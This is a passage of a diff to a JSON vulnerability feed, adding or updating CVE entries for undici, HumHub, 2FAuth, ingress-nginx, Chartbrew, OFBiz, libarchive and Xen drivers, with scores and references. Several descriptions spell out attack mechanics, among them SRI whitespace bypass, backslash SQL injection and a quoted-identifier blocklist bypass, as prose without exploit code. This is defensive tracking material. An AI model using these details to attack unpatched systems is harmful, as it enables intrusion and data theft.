+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T11:31:43.774082+00:00",
+      "matched": [
+        "undici"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 30.8,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 11.8,
+        "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-120415",
+      "aliases": [],
+      "title": "",
+      "description": "undici is an HTTP client for Node.js. In versions 7.0.0 through 7.30.1 and 8.0.0 through 8.12.3, the redirect interceptor strips sensitive headers such as Authorization, Cookie, Proxy-Authorization, and Host when a request is redirected to a different origin, but when request headers are supplied as an array of name and value tuples (a valid documented input, for example from Object.entries), the redirect handler misreads them as a flat list so the header names never match and the sensitive headers are not removed. If a header-normalizing interceptor such as cache or deduplicate is composed outside the redirect interceptor, it then serializes the retained headers onto the cross-origin request, disclosing the caller's origin-bound credentials to the unrelated redirect destination. This is a representation-dependent bypass of the cross-origin header stripping added in CVE-2024-30260. The issue is fixed in undici 7.30.2 and 8.12.4, and users should upgrade to one of those versions or later. As a workaround, supply request headers as a plain object or a flat name and value array rather than an array of tuples, or compose the redirect interceptor outside the normalizing interceptor.",
+      "published": "2026-11-06T10:16:36.633",
+      "updated": "2026-11-06T20:38:53.570",
+      "cvss": 5.9,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://cna.openjsf.org/security-advisories.html",
+        "https://github.com/nodejs/undici/security/advisories/GHSA-9v6h-8rgp-m69f"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T11:31:43.774082+00:00",
+      "matched": [
+        "undici"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 30.8,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 11.8,
+        "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-120423",
+      "aliases": [],
+      "title": "",
+      "description": "undici is an HTTP client for Node.js. In versions 7.15.0 through 7.30.1 and 8.0.0 through 8.12.3, fetch verifies Subresource Integrity metadata by splitting the integrity string on a single space, but the SRI grammar separates metadata by ASCII whitespace, which also includes the horizontal tab. An integrity value whose digest is preceded by a tab or other ASCII whitespace is parsed as a single unrecognized token and skipped, and when no recognized algorithm remains undici treats the integrity list as empty and accepts the response, so a server returning a body different from the pinned digest passes the check. An application that pins a response with a valid but whitespace-surrounded SRI value receives attacker-controlled bytes with no integrity error, and the attacker needs only to control the response body, not the integrity metadata. The issue is fixed in undici 7.30.2 and 8.12.4, and users should upgrade to one of those versions or later. As a workaround, supply SRI integrity metadata without surrounding whitespace, using a single space to separate multiple digests.",
+      "published": "2026-11-06T10:16:36.780",
+      "updated": "2026-11-06T20:38:53.570",
+      "cvss": 5.9,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://cna.openjsf.org/security-advisories.html",
+        "https://github.com/nodejs/undici/security/advisories/GHSA-r4pc-4jcp-7pqc"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T11:31:43.774082+00:00",
+      "matched": [
+        "undici"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 30.8,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 11.8,
+        "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-116630",
       "aliases": [],
       "title": "",
       "description": "undici is an HTTP client for Node.js. In versions 7.0.0 through 7.30.1 and 8.0.0 through 8.12.3, when an Agent composes the redirect and shared cache interceptors, a cached response that is revalidated with a conditional request can be validated by a 304 Not Modified from a different origin. When the origin that stored the response redirects the conditional revalidation request to another origin, the redirect handler strips origin-bound credential headers but not the cache-generated If-None-Match or If-Modified-Since validators, so the redirect destination receives the original origin's validator and undici treats its 304 as successful revalidation of the stored representation. As a result, a shared cache can serve the original origin's stored authenticated response, including one gated by Authorization, to a later unauthenticated caller. The issue is fixed in undici 7.30.2 and 8.12.4, and users should upgrade to one of those versions or later. As a workaround, compose the interceptors as cache then redirect, use per-origin dispatchers and cache stores, or disable shared caching on redirect-capable requests.",
       "published": "2026-11-06T11:17:05.497",
-      "updated": "2026-11-06T11:17:05.497",
+      "updated": "2026-11-06T20:38:53.570",
       "cvss": 5.9,
       "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
       "severity": "medium",
@@ -101111,6 +101382,56 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-115541",
+      "aliases": [],
+      "title": "",
+      "description": "HumHub Community Edition 1.19.0 contains a stored cross-site scripting vulnerability in the friendship confirmation dialog. An authenticated low-privileged member can save HTML in their first and last name. When another authenticated user clicks Friends for that profile, HumHub places the decoded display name into a modal through jQuery html(), causing attacker-controlled markup to execute in the victim's HumHub origin.",
+      "published": "2026-11-03T22:19:17.723",
+      "updated": "2026-11-06T20:17:11.063",
+      "cvss": 7.2,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://fluidattacks.com/advisories/toujours",
+        "https://github.com/humhub/humhub",
+        "https://github.com/humhub/humhub/pull/8624",
+        "https://github.com/humhub/humhub/pull/8625",
+        "https://github.com/humhub/humhub/releases/tag/v1.18.7",
+        "https://github.com/humhub/humhub/releases/tag/v1.19.3",
+        "https://github.com/humhub/humhub/security/advisories/GHSA-ph8x-wg86-qp2m"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00401,
+      "epss_percentile": 0.34504,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-04T01:22:55.664487+00:00",
+      "matched": [
+        "jquery"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 28.5,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 14.4,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-105613",
       "aliases": [],
       "title": "",
@@ -101248,58 +101569,6 @@
       "ai_analysis": ""
     },
     {
-      "id": "CVE-2026-115541",
-      "aliases": [],
-      "title": "HumHub 1.19.0 - Stored cross-site scripting in friendship confirmation",
-      "description": "HumHub Community Edition 1.19.0 contains a stored cross-site scripting vulnerability in the friendship confirmation dialog. An authenticated low-privileged member can save HTML in their first and last name. When another authenticated user clicks Friends for that profile, HumHub places the decoded display name into a modal through jQuery html(), causing attacker-controlled markup to execute in the victim's HumHub origin.",
-      "published": "2026-11-03T21:59:59.116Z",
-      "updated": "2026-11-03T22:19:17.723",
-      "cvss": 7.2,
-      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N",
-      "severity": "high",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [
-        "HumHub HumHub Community Edition"
-      ],
-      "references": [
-        "https://fluidattacks.com/advisories/toujours",
-        "https://github.com/humhub/humhub",
-        "https://github.com/humhub/humhub/security/advisories/GHSA-ph8x-wg86-qp2m",
-        "https://github.com/humhub/humhub/pull/8624",
-        "https://github.com/humhub/humhub/pull/8625",
-        "https://github.com/humhub/humhub/releases/tag/v1.19.3",
-        "https://github.com/humhub/humhub/releases/tag/v1.18.7"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
-      "x_mentions": null,
-      "sources": [
-        "cve.org",
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-11-04T01:22:55.664487+00:00",
-      "matched": [
-        "jquery"
-      ],
-      "match_type": "keyword",
-      "tier": 2,
-      "score": 28.4,
-      "level": "low",
-      "score_breakdown": {
-        "popularity": 14.0,
-        "cvss": 14.4
-      },
-      "ai_analysis": ""
-    },
-    {
       "id": "CVE-2026-122224",
       "aliases": [],
       "title": "WebVirtCloud through commit bb920b0 Missing Authorization in REST API Migrate and Create Endpoints",
@@ -101357,7 +101626,7 @@
       "title": "",
       "description": "Kubeflow Pipelines enables users to build and deploy portable, scalable machine learning workflows. Prior to 2.16.1, the multi-user API server treats the empty namespace used by shared or global pipelines as an authorization exception for modification and deletion operations. An authenticated user can modify or delete shared pipeline definitions and versions without the required Kubernetes RBAC permissions, compromising their integrity and availability. Read-only access to shared pipelines remains intentional, single-user deployments intentionally bypass multi-user checks, and execution of a modified pipeline is a conditional downstream consequence. The separate shared-pipeline multipart upload authorization path is outside this advisory and is not remediated by version 2.16.1. This issue is fixed in version 2.16.1.",
       "published": "2026-11-05T23:17:01.760",
-      "updated": "2026-11-05T23:17:01.760",
+      "updated": "2026-11-06T21:40:43.450",
       "cvss": 7.2,
       "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "high",
@@ -101375,8 +101644,8 @@
       "kev_date_added": "",
       "ransomware": false,
       "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
+      "epss": 0.0031,
+      "epss_percentile": 0.24033,
       "x_mentions": null,
       "sources": [
         "nvd"
@@ -101393,7 +101662,8 @@
       "level": "low",
       "score_breakdown": {
         "popularity": 14.0,
-        "cvss": 14.4
+        "cvss": 14.4,
+        "epss": 0.0
       },
       "ai_analysis": ""
     },
@@ -101988,7 +102258,7 @@
       "title": "",
       "description": "FFmpeg 2.0 through 9.0.2 contains a use of uninitialized variable vulnerability in the Go2Meeting decoder that allows attackers to leak stack memory through out-of-range palette indices. Attackers can craft a G2M3/G2M4 stream with a short Kempf palette so kempf_restore_buf() copies uninitialized stack bytes, including pointers or stack guards, into decoded output.",
       "published": "2026-11-01T01:17:17.593",
-      "updated": "2026-11-02T19:34:23.993",
+      "updated": "2026-11-06T19:17:42.133",
       "cvss": 6.8,
       "cvss_vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "medium",
@@ -102008,7 +102278,7 @@
       "ransomware": false,
       "ssvc_exploitation": "",
       "epss": 0.00124,
-      "epss_percentile": 0.02087,
+      "epss_percentile": 0.02132,
       "x_mentions": null,
       "sources": [
         "nvd"
@@ -102132,7 +102402,7 @@
       "title": "",
       "description": "FFmpeg 2.3 through 9.0.2 contains a use of uninitialized resource vulnerability in the Huffyuv decoder that allows attackers to leak heap memory into decoded pixels via short packed-BGR bitstreams. Attackers can craft a Huffyuv BGR24/BGRA video whose entropy data ends early, causing decode_slice() to add uninitialized s->temp[0] bytes into output frames, exposing heap contents.",
       "published": "2026-11-01T01:17:18.323",
-      "updated": "2026-11-02T19:34:23.993",
+      "updated": "2026-11-06T19:17:42.310",
       "cvss": 6.8,
       "cvss_vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "medium",
@@ -102152,7 +102422,7 @@
       "ransomware": false,
       "ssvc_exploitation": "",
       "epss": 0.00124,
-      "epss_percentile": 0.02088,
+      "epss_percentile": 0.02132,
       "x_mentions": null,
       "sources": [
         "nvd"
@@ -103057,6 +103327,54 @@
         "popularity": 14.0,
         "cvss": 13.0,
         "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-63437",
+      "aliases": [],
+      "title": "2FAuth: Missing Authorization on Share Recipients Endpoint Allows Cross-User Account Enumeration",
+      "description": "2FAuth is a web app to manage Two-Factor Authentication (2FA) accounts and generate their security codes. Prior to 8.0.0, the recipients() method in app/Api/v1/Controllers/TwoFAccountShareController.php receives a caller-selected TwoFAccount through Laravel model binding but does not call the manageShares authorization policy before listing its recipients. When account sharing is enabled, an authenticated user can call GET /api/v1/twofaccounts/{victimId}/recipients for accounts owned by other users, enumerate registered user IDs and display names, test exact email addresses with filter[nameOrEmail], and inspect each account's sharing relationships. This issue is fixed in version 8.0.0.",
+      "published": "2026-11-06T20:16:05.692Z",
+      "updated": "2026-11-06T21:17:09.593",
+      "cvss": 6.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [
+        "Bubka 2FAuth"
+      ],
+      "references": [
+        "https://github.com/Bubka/2FAuth/security/advisories/GHSA-m52c-63g8-qg5c",
+        "https://github.com/Bubka/2FAuth/commit/08753afbd847da8fa285e2ad857693ff88e46b84",
+        "https://github.com/Bubka/2FAuth/releases/tag/v8.0.0"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "cve.org",
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T23:31:58.291375+00:00",
+      "matched": [
+        "laravel"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 27.0,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 13.0
       },
       "ai_analysis": ""
     },
@@ -104805,7 +105123,7 @@
       "title": "",
       "description": "Kubeflow Pipelines enables users to build and deploy portable, scalable machine learning workflows. Prior to 2.18.0, the legacy V1/raw-Argo execution cache mutating webhook and cache-server storage path hash selected template fields without the Kubernetes namespace, use the key alone for lookups and duplicate checks, and trust the mutable pipelines.kubeflow.org/execution_cache_key annotation when publishing outputs. In multi-user deployments where tenant namespaces share the cache service, a tenant with workload-submission privileges can read another namespace's cached outputs or seed matching outputs that are substituted into a later step. Standard KFP V2 component pods bypass this cache, matching requires the selected template fields and staleness policy, and arbitrary code execution or service availability impact is not established. This issue is fixed in version 2.18.0.",
       "published": "2026-11-05T23:17:01.600",
-      "updated": "2026-11-05T23:17:01.600",
+      "updated": "2026-11-06T21:40:43.450",
       "cvss": 5.4,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
       "severity": "medium",
@@ -104823,8 +105141,8 @@
       "kev_date_added": "",
       "ransomware": false,
       "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
+      "epss": 0.0015,
+      "epss_percentile": 0.042,
       "x_mentions": null,
       "sources": [
         "nvd"
@@ -104841,7 +105159,8 @@
       "level": "low",
       "score_breakdown": {
         "popularity": 14.0,
-        "cvss": 10.8
+        "cvss": 10.8,
+        "epss": 0.0
       },
       "ai_analysis": ""
     },
@@ -104981,6 +105300,52 @@
       "score_breakdown": {
         "popularity": 14.0,
         "cvss": 10.6
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-116472",
+      "aliases": [],
+      "title": "",
+      "description": "A security issue was discovered in ingress-nginx where a user with permission to create an Ingress may be able to cause denial of service of the ingress-nginx data plane, or possibly redirect traffic from other Ingresses. Kubernetes clusters are only affected if they are using ingress-nginx.\n\nDue to a missing check, the mirror-target Ingress annotation can be used to target an unauthenticated configuration API within the ingress-nginx controller, allowing write commands to be submitted. Corrupting the data within that configuration API results in all traffic through ingress-nginx being dropped until an Ingress configuration change or a controller restart causes the data to be recreated correctly.\n\nIn principle, this write access could also be used to redirect traffic from other Ingresses controlled by the same ingress-nginx instance. In practice, there is negligible additional risk: such redirection would require privileged information about internal ingress-nginx state, and users can already redirect traffic from other Ingresses controlled by the same ingress-nginx anyway.",
+      "published": "2026-11-05T19:17:10.690",
+      "updated": "2026-11-06T20:39:15.033",
+      "cvss": 2.7,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:L",
+      "severity": "low",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/kubernetes/kubernetes/issues/143852",
+        "http://www.openwall.com/lists/oss-security/2026/11/05/4"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00411,
+      "epss_percentile": 0.356,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-05T23:38:48.927446+00:00",
+      "matched": [
+        "kubernetes"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 24.5,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 5.4,
+        "unauth_network": 5,
+        "epss": 0.1
       },
       "ai_analysis": ""
     },
@@ -106055,6 +106420,54 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-69128",
+      "aliases": [],
+      "title": "Chartbrew: AI orchestrator run_query SQL blocklist bypass enables arbitrary file read on connected PostgreSQL (quoted-identifier + pg_stat_file/pg_ls_* sibling gap)",
+      "description": "Chartbrew is an open-source web application that can connect directly to databases and APIs and use the data to create charts. In 5.2.2, the AI SQL blocklist omitted sibling PostgreSQL filesystem functions and failed to match double-quoted identifier forms of denied functions. The vulnerable surface is the AI query tool's PostgreSQL SQL-validation blocklist. A team Owner or Admin uses an AI-enabled PostgreSQL connection whose database role can call server-side file functions and causes generated SQL to use an unlisted sibling function or a double-quoted denied function. Unlisted sibling functions remain allowed, and double-quoted function identifiers bypass the denylist regular expressions and reach PostgreSQL. AI features must be enabled and the user must have elevated Chartbrew privileges. A PostgreSQL superuser or pg_read_server_files role can resolve absolute paths to files readable by the PostgreSQL OS user, while a non-superuser is limited to the source-stated PGDATA-relative scope. This vulnerability is fixed in 5.2.3.",
+      "published": "2026-11-06T21:17:12.971Z",
+      "updated": "2026-11-06T22:17:59.700",
+      "cvss": 4.6,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [
+        "chartbrew chartbrew"
+      ],
+      "references": [
+        "https://github.com/chartbrew/chartbrew/security/advisories/GHSA-jw2r-hrxg-cfgc",
+        "https://github.com/chartbrew/chartbrew/commit/b83f656a8757beccba461f0f6c5abb1a25dc3b4c",
+        "https://github.com/chartbrew/chartbrew/releases/tag/v5.2.3"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "cve.org",
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T23:31:58.291375+00:00",
+      "matched": [
+        "postgresql"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 23.2,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 9.2
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-115914",
       "aliases": [],
       "title": "",
@@ -106790,6 +107203,53 @@
         "popularity": 7.0,
         "cvss": 14.2,
         "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-17591",
+      "aliases": [],
+      "title": "",
+      "description": "A flaw was found in libarchive. An attacker can cause a Denial of Service (DoS) or potential information disclosure due to a use-after-free vulnerability, which occurs when a program reads memory that has already been released. This issue arises when the archive_entry_copy_mac_metadata() function deallocates an internal buffer before completing a data copy. An attacker who can supply input to an application utilizing this function can trigger the flaw to crash the application or read uninitialized memory data.",
+      "published": "2026-10-16T23:17:01.420",
+      "updated": "2026-11-06T19:17:46.670",
+      "cvss": 3.6,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:L",
+      "severity": "low",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://access.redhat.com/errata/RHSA-2026:77775",
+        "https://access.redhat.com/security/cve/CVE-2026-17591",
+        "https://bugzilla.redhat.com/show_bug.cgi?id=2554209",
+        "https://github.com/libarchive/libarchive/pull/3318"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00154,
+      "epss_percentile": 0.04525,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T23:31:58.291375+00:00",
+      "matched": [
+        "libarchive"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 21.2,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 7.2,
+        "epss": 0.0
       },
       "ai_analysis": ""
     },
@@ -129950,7 +130410,7 @@
       "title": "xen-netback: Fix UAF when reading statistics data",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nxen-netback: Fix UAF when reading statistics data\n\nThe network statistic data in the driver is protected by RCU.\nUnfortunately when tearing down the queues after an error during\nconnecting to the frontend (e.g. due to illegal Xenstore data filled\nin by the guest), the statistic data is being freed without\nsynchronizing the RCU state.  In case the data is being read via sysfs\nin this phase, access to already freed memory or memory being in new\nuse is possible.\n\nFix that by calling synchronize_net() before freeing the queue data.\n\nThis is XSA-526 / CVE-2026-100080",
       "published": "2026-11-06T18:23:01.824Z",
-      "updated": "2026-11-06T18:23:01.824Z",
+      "updated": "2026-11-06T19:17:03.190",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
@@ -129966,7 +130426,9 @@
         "https://git.kernel.org/stable/c/89e534265b62c94749639350200b10370564bb3a",
         "https://git.kernel.org/stable/c/6cd611d2abdd8623a554e14145f82c1cb4e4467a",
         "https://git.kernel.org/stable/c/37d5a73170579b30e67cc8b19ec69715eea3a6b6",
-        "https://git.kernel.org/stable/c/4867687b6ad28ab84bc0811d8f8f9972e769da02"
+        "https://git.kernel.org/stable/c/4867687b6ad28ab84bc0811d8f8f9972e769da02",
+        "http://www.openwall.com/lists/oss-security/2026/11/06/9",
+        "http://xenbits.xen.org/xsa/advisory-526.html"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -129977,7 +130439,8 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org"
+        "cve.org",
+        "nvd"
       ],
       "category": "vuln",
       "resolved_at": "",
@@ -130000,7 +130463,7 @@
       "title": "xen-netback: defer xenvif_mcast_addr_list_free()",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nxen-netback: defer xenvif_mcast_addr_list_free()\n\nIn order for the function to legitimately avoid locking/RCU, it needs to\nrun after all TX/RX processing has finished/stopped: Lookups happen from\nxenvif_start_xmit(), while adds/removes happen from xenvif_tx_action()\n(called out of xenvif_poll()).\n\nMove the call out of xenvif_disconnect_data() (the call to the function\nfrom connect()'s error path doesn't require any cleaning up there), and\nput it past the synchronization point in backend_disconnect().\n\nThis is XSA-527 / CVE-2026-100081.",
       "published": "2026-11-06T18:23:02.185Z",
-      "updated": "2026-11-06T18:23:02.185Z",
+      "updated": "2026-11-06T19:17:03.373",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
@@ -130016,7 +130479,9 @@
         "https://git.kernel.org/stable/c/0d515c409033c8e2a645a781be3ca76ab825fc8c",
         "https://git.kernel.org/stable/c/a6bb2f1fa62c56279bdcdadce28d1310c5e12b62",
         "https://git.kernel.org/stable/c/34f0f63dc6dc11895a17bb5672451b6b11622c99",
-        "https://git.kernel.org/stable/c/fb38fc58acb26d74fe8f7b19621fafaae3c040ff"
+        "https://git.kernel.org/stable/c/fb38fc58acb26d74fe8f7b19621fafaae3c040ff",
+        "http://www.openwall.com/lists/oss-security/2026/11/06/10",
+        "http://xenbits.xen.org/xsa/advisory-527.html"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -130027,7 +130492,8 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org"
+        "cve.org",
+        "nvd"
       ],
       "category": "vuln",
       "resolved_at": "",
@@ -130050,7 +130516,7 @@
       "title": "xen-blkback: Avoid UAF when reading I/O statistics",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nxen-blkback: Avoid UAF when reading I/O statistics\n\nReading I/O statistics via sysfs concurrently with tearing down a\nfrontend device might result in UAF or a NULL dereference, as the\nreading of the statistics data is not synchronized with freeing the\ndata.\n\nUse a rwlock for synchronizing.\n\nThis is XSA-528 / CVE-2026-100082",
       "published": "2026-11-06T18:23:02.627Z",
-      "updated": "2026-11-06T18:23:02.627Z",
+      "updated": "2026-11-06T19:17:03.517",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
@@ -130066,7 +130532,9 @@
         "https://git.kernel.org/stable/c/fe9ead8c5bdb752e329cecfecbdb5dfca5e9996b",
         "https://git.kernel.org/stable/c/b764e17313534794aeb99c901869f213e36a16ef",
         "https://git.kernel.org/stable/c/c49934da934cf495faf782aa5d84f413221c9be6",
-        "https://git.kernel.org/stable/c/b0378161c28e77e4d0e2eda3c9433ab4394d2a2f"
+        "https://git.kernel.org/stable/c/b0378161c28e77e4d0e2eda3c9433ab4394d2a2f",
+        "http://www.openwall.com/lists/oss-security/2026/11/06/11",
+        "http://xenbits.xen.org/xsa/advisory-528.html"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -130077,7 +130545,8 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org"
+        "cve.org",
+        "nvd"
       ],
       "category": "vuln",
       "resolved_at": "",
@@ -142694,18 +143163,16 @@
     {
       "id": "CVE-2026-81815",
       "aliases": [],
-      "title": "Apache OFBiz: SQL injection  - performFind ignore-case values, MySQL/MariaDB",
+      "title": "",
       "description": "SQL Injection in the entity engine's generic performFind service in Apache OFBiz 24.09 before 24.09.08 on MySQL/MariaDB-backed deployments allows a remote unauthenticated attacker to disclose arbitrary rows from the queried entity by submitting an ignore-case find request (e.g. _ic=Y) with a crafted value, causing SqlJdbcUtil.addValueSingle to inline the EntityFunction-wrapped value directly into the SQL text using ANSI-only single-quote doubling instead of binding it as a parameter, which is insufficient on MySQL/MariaDB because those dialects also honor backslash escapes, letting a backslash-terminated payload break out of the string literal and turn the WHERE clause into a tautology. The default Derby datasource and PostgreSQL are not affected because they do not interpret backslash as an escape character in this context. Users are recommended to upgrade to version 24.09.08, which fixes this issue.",
-      "published": "2026-11-05T14:06:58.943Z",
-      "updated": "2026-11-05T15:17:26.527",
+      "published": "2026-11-05T15:17:26.527",
+      "updated": "2026-11-06T21:36:32.997",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "Apache Software Foundation Apache OFBiz"
-      ],
+      "vendor_products": [],
       "references": [
         "https://lists.apache.org/thread.html/7b2syzksp7klt9fvhdg0olldvs2g83lz"
       ],
@@ -142714,11 +143181,10 @@
       "kev_date_added": "",
       "ransomware": false,
       "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
+      "epss": 0.00276,
+      "epss_percentile": 0.20121,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -142733,7 +143199,8 @@
       "level": "low",
       "score_breakdown": {
         "popularity": 14.0,
-        "unauth_network": 5
+        "unauth_network": 5,
+        "epss": 0.0
       },
       "ai_analysis": ""
     },
@@ -144114,6 +144581,46 @@
         "pki"
       ],
       "match_type": "pki",
+      "tier": null,
+      "score": 10.0,
+      "level": "low",
+      "score_breakdown": {},
+      "ai_analysis": ""
+    },
+    {
+      "id": "OUT-aws-AWS_EC2_OPERATIONAL_ISSUE_62978_C9C1126888D",
